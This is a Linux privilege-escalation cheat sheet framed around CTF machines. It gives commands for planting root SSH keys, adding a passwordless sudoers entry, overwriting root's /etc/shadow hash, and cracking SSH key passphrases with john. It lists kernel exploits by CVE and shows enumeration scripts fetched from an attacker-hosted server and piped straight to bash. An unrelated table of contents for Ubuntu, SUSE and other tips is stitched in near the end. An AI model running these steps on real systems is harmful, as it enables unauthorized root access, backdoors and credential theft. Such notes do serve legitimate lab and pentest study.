*Root SSH Key* If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.  

```
cat /etc/ssh/sshd_config | grep PermitRootLogin
```  

*Add SUDOers* If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser):  
/etc/sudoers  

```
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
myuser ALL=(ALL) NOPASSWD:ALL  
```

*Set Root Password* We can also change the root password on the host if we can write to any file as root:  
/etc/shadow  

```
printf root:>shadown
openssl passwd -1 -salt salty password >>shadow
```

## Kernel Exploits

Based on the Kernel version, do we have some reliable exploits that can be used?

UDEV - Linux Kernel < 2.6 & UDEV < 1.4.1 - CVE-2009-1185 - April 2009  

 Ubuntu 8.10  
 Ubunto 9.04  
 Gentoo  

RDS -  Linux Kernel <= 2.6.36-rc8 - CVE-2010-3904 - Linux  Exploit -

 Centos 4/5

perf_swevent_init - Linux Kernel < 3.8.9 (x86-64) - CVE-2013-2094 - June 2013  

 Ubuntu 12.04.2  

mempodipper - Linux Kernel 2.6.39 < 3.2.2 (x86-64) - CVE-2012-0056 - January 2012  

    Ubuntu 11.10
    Ubuntu 10.04  
    Redhat 6  
    Oracle 6  

Dirty Cow - Linux Kernel 2.6.22 < 3.2.0/3.13.0/4.8.3 - CVE-2016-5195 - October 2016

 Ubuntu 12.04
 Ubuntu 14.04
 Ubuntu 16.04

KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 2017

 Ubuntu 14.04
 Ubuntu 16.04

Great list here:
<https://github.com/lucyoa/kernel-exploits>

## Automated Linux Enumeration Scripts

It is always a great idea to automate the enumeration process once you understand what you are looking for.

### LinEmum.sh

LinEnum is a handy method of automating Linux enumeration.  It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.

First we need to git a copy to our local Kali linux machine:

```
git clone https://github.com/rebootuser/LinEnum.git
```

Next we can serve it up in the python simple web server:

```
root@kali:~test# cd LinEnum/
root@kali:~test/LinEnum# ls
root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:

```
www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash
```

And the enumeration script should run on the remote machine.

## CTF Machine Tactics

Often it is easy to identify when a machine was created by the date / time of file edits.
We can create a list of all the files with a modify time in that timeframe with the following command:

```
find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt
```

This has helped me to find interesting files on a few different CTF machines.

Recursively searching for passwords is also a handy technique:

```
grep -ri "passw" .
```

Wget Pipe a remote URL directory to Bash (linpeas):

```
wget -q -O - "http://10.10.10.10/linpeas.sh" | bash
```

Curl Pipe a remote URL directly to Bash (linpeas):

```
curl -sSk "http://10.10.10.10/linpeas.sh" | bash
```

## Using SSH Keys

Often, we are provided with password protected SSH keys on CTF boxes.  It it helpful to be able to quicky crack and add these to your private keys.

First we need to convert the ssh key using John:

```
kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john
...
```

Next we will need to use that format to crack the password:

```
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john
```

John should output a password for the private key.

```

```

# Content

See [doc](doc/) directory here.

- [Ubuntu tips](doc/ubuntu-tips.md)
- [SUSE tips](doc/suse-tips.md)
- [YaST development tips](doc/yast-devel-tips.md)
- [VirtualBox tips](doc/virtualbox-tips.md)
- [youtube-dl tips](doc/youtube-dl.md)
- [Android tips](doc/android-tips.md)

## References

<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
<http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/>  
<https://payatu.com/guide-linux-privilege-escalation/>  
<http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/>  
<http://www.0daysecurity.com/penetration-testing/enumeration.html>  
<https://www.rebootuser.com/?p=1623#.V0W5Pbp95JP>  
<https://www.doomedraven.com/2013/04/hacking-linux-part-i-privilege.html>  
<https://securism.wordpress.com/oscp-notes-privilege-escalation-linux/>  
<https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/>  
<http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html>  
<https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>
<https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/>  
<https://digi.ninja/blog/when_all_you_can_do_is_read.php>  
<https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2>  
<https://gtfobins.github.io/>  
<https://github.com/rebootuser/LinEnum>
